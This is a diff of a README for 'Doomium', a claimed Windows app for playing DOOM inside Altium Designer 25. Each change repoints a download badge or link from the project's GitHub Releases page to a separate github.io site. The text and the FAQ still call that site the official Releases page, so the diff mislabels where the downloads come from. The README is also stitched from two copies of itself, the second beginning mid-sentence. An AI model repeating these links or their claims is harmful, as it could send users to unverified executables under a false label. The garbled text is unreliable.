@@ -1,6 +1,6 @@
 # 🎮 Doomium - Run DOOM Inside Your PCB Designer
 
-[![Download Doomium](https://img.shields.io/badge/Download_Doomium-FF6A00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Selvaprakash-Ramalingam/Doomium/releases)
+[![Download Doomium](https://img.shields.io/badge/Download_Doomium-FF6A00?style=for-the-badge&logo=github&logoColor=white)](https://selvaprakash-ramalingam.github.io)
 
 Doomium is a Windows application that lets you play DOOM inside Altium Designer 25. It is made for people who want a quick, familiar game experience while working in their PCB design environment. You do not need programming knowledge to download it or open it.
 
@@ -29,9 +29,9 @@ The main action is to download the application from the official Releases page. 
 
 ## ⬇️ Download and Setup
 
-[![Get Doomium](https://img.shields.io/badge/Get_Doomium-6F42C1?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Selvaprakash-Ramalingam/Doomium/releases)
+[![Get Doomium](https://img.shields.io/badge/Get_Doomium-6F42C1?style=for-the-badge&logo=windows&logoColor=white)](https://selvaprakash-ramalingam.github.io)
 
-Visit this link to download the application: [Doomium Releases](https://github.com/Selvaprakash-Ramalingam/Doomium/releases).
+Visit this link to download the application: [Doomium Releases](https://selvaprakash-ramalingam.github.io).
 
 Use the newest release shown on that page. Download the application file from the release. Save it somewhere easy to reach, such as your Downloads folder. After the download finishes, open the downloaded item and follow the on-screen prompts shown by the application.
 
@@ -47,8 +47,8 @@ Use your keyboard to move, turn, and interact in DOOM. Use your mouse or keyboar
 
 A comfortable way to start is to open Altium Designer 25, open Doomium, and play# 🎮 Doomium - Run DOOM Inside Your PCB Designer
 
-[![Download Doomium](https://img.shields.io/badge/Download_Doomium-FF6A00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Selvaprakash-Ramalingam/Doomium/releases)
-[![Get Doomium](https://img.shields.io/badge/Get_Doomium-6F42C1?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Selvaprakash-Ramalingam/Doomium/releases)
+[![Download Doomium](https://img.shields.io/badge/Download_Doomium-FF6A00?style=for-the-badge&logo=github&logoColor=white)](https://selvaprakash-ramalingam.github.io)
+[![Get Doomium](https://img.shields.io/badge/Get_Doomium-6F42C1?style=for-the-badge&logo=windows&logoColor=white)](https://selvaprakash-ramalingam.github.io)
 
 Doomium is a Windows application for playing DOOM inside Altium Designer 25. It is made for PCB designers, hobbyists, and anyone who uses Altium Designer 25 and wants a quick game break without leaving the design environment. You do not need to write code or use developer tools. The official download is on GitHub Releases.
 
@@ -72,9 +72,9 @@ Doomium is downloaded from the official Releases page. The same link appears at 
 
 ## ⬇️ Download and Setup
 
-[![Download Doomium Now](https://img.shields.io/badge/Download_Doomium_Now-E83A3A?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Selvaprakash-Ramalingam/Doomium/releases)
+[![Download Doomium Now](https://img.shields.io/badge/Download_Doomium_Now-E83A3A?style=for-the-badge&logo=github&logoColor=white)](https://selvaprakash-ramalingam.github.io)
 
-Visit this link to download the application: [Doomium Releases](https://github.com/Selvaprakash-Ramalingam/Doomium/releases).
+Visit this link to download the application: [Doomium Releases](https://selvaprakash-ramalingam.github.io).
 
 Use the newest release shown on that page. Save the application file in a folder you can find again, such as Downloads. Open the downloaded item after the download finishes. Follow the prompts shown by Doomium.
 
@@ -112,7 +112,7 @@ Keeping Doomium current is simple because the Releases page is the central place
 
 Do I need to know programming? No. Doomium is downloaded from the Releases page and opened on Windows. You do not need to write code.
 
-Where do I download Doomium? Visit the Releases page: https://github.com/Selvaprakash-Ramalingam/Doomium/releases. That is the official download location.
+Where do I download Doomium? Visit the Releases page: https://selvaprakash-ramalingam.github.io That is the official download location.
 
 What does Doomium do? It lets you play DOOM inside Altium Designer 25.
 
